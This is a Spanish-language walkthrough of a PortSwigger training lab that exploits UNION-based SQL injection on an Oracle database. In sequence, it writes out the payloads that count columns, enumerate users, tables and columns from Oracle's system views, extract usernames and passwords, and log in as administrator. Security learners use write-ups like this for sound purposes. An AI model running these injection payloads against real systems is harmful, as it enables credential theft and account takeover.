# SQL Injection Attack - Listing Database Contents on Oracle

## 📌 Lab Information

- **Lab:** Listing Database Contents on Oracle
- **Categoría:** UNION SQL Injection
- **Motor BD:** Oracle

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

---

## 🎯 Objetivo

Enumerar tablas, columnas y extraer credenciales desde una base de datos Oracle.

---

## 🔍 Enumeración de columnas

Utilizamos:

```sql
' ORDER BY 2 -- -
```

Posteriormente validamos columnas visibles:

```sql
' union select 'a','b' from dual --
```

![Validación columnas](../Imagenes/pasted-image-20260331160433.png)

---

## 🚀 Listado de usuarios Oracle

```sql
' union select username,null from all_users --
```

![Usuarios Oracle](../Imagenes/pasted-image-20260331162533.png)

---

## 🚀 Listado de tablas

```sql
' union select table_name,null from all_tables --
```

![Listado tablas](../Imagenes/pasted-image-20260331162758.png)

---

## 🔍 Tabla objetivo

Identificamos la tabla:

```text
USERS_LETRASALEATORIAS
```

![Tabla users](../Imagenes/pasted-image-20260331163830.png)

---

## 🚀 Listado de columnas

```sql
' union select column_name,null from all_tab_columns --
```

![Columnas Oracle](../Imagenes/pasted-image-20260331163129.png)

---

## 🔍 Columnas de la tabla users

```sql
' union select column_name,null from all_tab_columns WHERE table_name='USERS_LETRASALEATORIAS' --
```

![Columnas users](../Imagenes/pasted-image-20260331164011.png)

---

## 🚀 Extracción de credenciales

```sql
' union select USERNAME_LETRASALEATORIAS,PASSWORD_LETRASALEATORIAS from USERS_LETRASALEATORIAS --
```

![Credenciales Oracle](../Imagenes/pasted-image-20260331170718.png)

---

## 🔓 Acceso administrador

![Login administrador](../Imagenes/pasted-image-20260331171027.png)

---

## ✅ Resultado

Se logró:
- Enumerar tablas Oracle
- Enumerar columnas
- Extraer credenciales
- Acceder como administrador
